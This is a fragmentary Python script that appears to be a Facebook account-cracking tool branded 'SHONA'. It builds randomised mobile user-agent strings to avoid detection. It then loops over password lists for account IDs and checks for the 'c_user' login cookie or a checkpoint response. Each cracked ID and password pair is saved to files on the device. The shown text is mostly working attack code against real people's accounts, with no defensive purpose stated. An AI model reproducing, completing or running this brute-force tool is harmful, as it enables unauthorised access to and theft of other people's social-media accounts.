...
for xd in range(3000):
	...
	ugent1 = f"Mozilla/5.0 (Linux; Android 5.1; P5 mini Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
	ugent2 = f"Mozilla/5.0 (Linux; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
	ugent3 = f"Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
...
syed =['Mozilla/5.0 (Linux; Android 12; SM-F415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
...
##    ## ##     ## ##     ## ##   ### ##     ## 
 ######  ##     ##  #######  ##    ## ##     ## 
\033[1;93m--------------------------------------------------
\033[1;37m[-] OWNER     :\033[1;32m M.R SHONA
\033[1;37m[-] GITHUB    :\033[1;32m Coming
...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SHONA-.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHONA] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				print('\33[38;5;208m[SHONA-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SHONA--CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHONA:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SHONA-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/SHONA-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHONA] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				...
				print('\r\r\033[0;92m[SHONA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\33[38;5;208m[SHONA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[0;92mSHONA\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[SHONA-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[38;5;208m[SHONA-CP] '+cid+' | '+ps+'\033[0;92m')
